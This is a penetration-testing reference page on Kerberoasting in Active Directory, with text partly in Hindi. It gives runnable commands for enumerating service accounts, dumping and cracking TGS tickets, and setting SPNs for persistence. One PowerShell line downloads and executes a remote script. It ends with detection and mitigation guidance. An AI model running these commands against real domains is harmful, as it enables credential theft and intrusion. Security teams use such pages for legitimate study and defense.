# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting **TGS टिकटों** के अधिग्रहण पर केंद्रित है, विशेष रूप से उन सेवाओं से संबंधित जो **उपयोगकर्ता खातों** के तहत **Active Directory (AD)** में कार्यरत हैं, **कंप्यूटर खातों** को छोड़कर। इन टिकटों का एन्क्रिप्शन उन कुंजियों का उपयोग करता है जो **उपयोगकर्ता पासवर्ड** से उत्पन्न होती हैं, जिससे **ऑफलाइन क्रेडेंशियल क्रैकिंग** की संभावना होती है। एक सेवा के रूप में उपयोगकर्ता खाते का उपयोग एक गैर-खाली **"ServicePrincipalName"** प्रॉपर्टी द्वारा संकेतित किया जाता है।

**Kerberoasting** को निष्पादित करने के लिए, एक डोमेन खाता आवश्यक है जो **TGS टिकटों** का अनुरोध करने में सक्षम हो; हालाँकि, इस प्रक्रिया के लिए **विशेष विशेषाधिकार** की आवश्यकता नहीं होती है, जिससे यह किसी भी व्यक्ति के लिए **मान्य डोमेन क्रेडेंशियल्स** के साथ सुलभ हो जाता है।

### मुख्य बिंदु:

- **Kerberoasting** **AD** के भीतर **उपयोगकर्ता-खाता सेवाओं** के लिए **TGS टिकटों** को लक्षित करता है।
- **उपयोगकर्ता पासवर्ड** से प्राप्त कुंजियों के साथ एन्क्रिप्टेड टिकटों को **ऑफलाइन क्रैक** किया जा सकता है।
- एक सेवा को एक **ServicePrincipalName** द्वारा पहचाना जाता है जो शून्य नहीं है।
- **विशेष विशेषाधिकार** की आवश्यकता नहीं है, केवल **मान्य डोमेन क्रेडेंशियल्स**।

### **हमला**

> [!WARNING]
> **Kerberoasting उपकरण** आमतौर पर हमले को करते समय और TGS-REQ अनुरोध शुरू करते समय **`RC4 एन्क्रिप्शन`** का अनुरोध करते हैं। इसका कारण यह है कि **RC4** [**कमजोर**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) है और Hashcat जैसे उपकरणों का उपयोग करके अन्य एन्क्रिप्शन एल्गोरिदम जैसे AES-128 और AES-256 की तुलना में ऑफलाइन क्रैक करना आसान है।\
> RC4 (प्रकार 23) हैश **`$krb5tgs$23$*`** से शुरू होते हैं जबकि AES-256 (प्रकार 18) **`$krb5tgs$18$*`** से शुरू होते हैं।\
> इसके अलावा, सावधान रहें क्योंकि `Rubeus.exe kerberoast` सभी कमजोर खातों पर स्वचालित रूप से टिकटों का अनुरोध करेगा जिससे आपको पता चल जाएगा। पहले उन उपयोगकर्ताओं को खोजें जिनके पास दिलचस्प विशेषाधिकार हैं और फिर केवल उनके ऊपर इसे चलाएँ।
```bash

#### **Linux**

```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # पासवर्ड मांगा जाएगा
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. kerberoastable उपयोगकर्ताओं की गणना करें
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. हैश डंप करें
```

Multi-features tools including a dump of kerberoastable users:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```

#### Windows

- **Enumerate Kerberoastable users**

```bash
# Kerberoastable उपयोगकर्ताओं को प्राप्त करें
setspn.exe -Q */* #यह एक अंतर्निहित बाइनरी है। उपयोगकर्ता खातों पर ध्यान दें
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```

- **Technique 1: Ask for TGS and dump it from memory**

```bash
# एकल उपयोगकर्ता से मेमोरी में TGS प्राप्त करें
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #उदाहरण: MSSQLSvc/mgmt.domain.local

# सभी kerberoastable खातों के लिए TGS प्राप्त करें (PCs शामिल, वास्तव में स्मार्ट नहीं)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# मेमोरी में kerberos टिकटों की सूची बनाएं
klist

# उन्हें मेमोरी से निकालें
Invoke-Mimikatz -Command '"kerberos::list /export"' #वर्तमान फ़ोल्डर में टिकट निर्यात करें

# kirbi टिकट को john में परिवर्तित करें
python2.7 kirbi2john.py sqldev.kirbi
# john को hashcat में परिवर्तित करें
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

- **Technique 2: Automatic tools**

```bash
# Powerview: एक उपयोगकर्ता का Kerberoast हैश प्राप्त करें
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #PowerView का उपयोग करते हुए उदाहरण: MSSQLSvc/mgmt.domain.local
# Powerview: सभी Kerberoast हैश प्राप्त करें
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #विशिष्ट उपयोगकर्ता
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #व्यवस्थापकों का प्राप्त करें

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

> [!WARNING]
> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.

### Cracking

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigation

Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:

- The service name should not be **krbtgt**, as this is a normal request.
- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

To mitigate the risk of Kerberoasting:

- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.

## Kerberoast w/o domain account

In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```

#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
